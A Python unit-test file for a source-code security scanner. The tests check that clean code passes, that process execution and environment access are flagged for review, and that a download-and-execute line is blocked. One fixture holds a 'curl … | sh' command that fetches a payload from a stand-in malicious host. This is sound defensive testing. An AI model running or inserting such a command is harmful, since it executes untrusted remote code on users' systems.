from __future__ import annotations

import unittest

from researcher.security_gate import (
    SecuritySeverity,
    SecurityVerdict,
    SourceArtifact,
    scan_source_artifacts,
)


class SecurityGateTests(unittest.TestCase):
    def test_empty_input_is_not_scanned_and_not_certifiable(self) -> None:
        result = scan_source_artifacts([])
        self.assertEqual(result.verdict, SecurityVerdict.NOT_SCANNED)
        self.assertEqual(result.scanned_files, 0)
        self.assertFalse(result.certification_eligible)
        self.assertFalse(result.executed_untrusted_code)

    def test_clean_source_passes_without_execution(self) -> None:
        artifact = SourceArtifact(
            path="lib/client.dart",
            content="class Client { String read() => 'ok'; }",
        )
        result = scan_source_artifacts([artifact])
        self.assertEqual(result.verdict, SecurityVerdict.PASS)
        self.assertTrue(result.certification_eligible)
        self.assertFalse(result.executed_untrusted_code)
        self.assertEqual(result.findings, ())

    def test_shell_download_execute_is_blocked(self) -> None:
        result = scan_source_artifacts(
            [SourceArtifact(path="install.sh", content="curl https://evil.invalid/payload | sh")]
        )
        self.assertEqual(result.verdict, SecurityVerdict.BLOCK)
        self.assertFalse(result.certification_eligible)
        self.assertIn(SecuritySeverity.CRITICAL, {item.severity for item in result.findings})

    def test_process_execution_requires_review(self) -> None:
        result = scan_source_artifacts(
            [SourceArtifact(path="tool.py", content="subprocess.run(['git', 'status'])")]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(result.certification_eligible)
        self.assertIn("process_execution", {item.rule_id for item in result.findings})

    def test_secret_environment_access_requires_review(self) -> None:
        result = scan_source_artifacts(
            [SourceArtifact(path="lib/config.dart", content="final env = Platform.environment;")]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(result.certification_eligible)
        self.assertIn("secret_environment_access", {item.rule_id for item in result.findings})


if __name__ == "__main__":
    unittest.main()
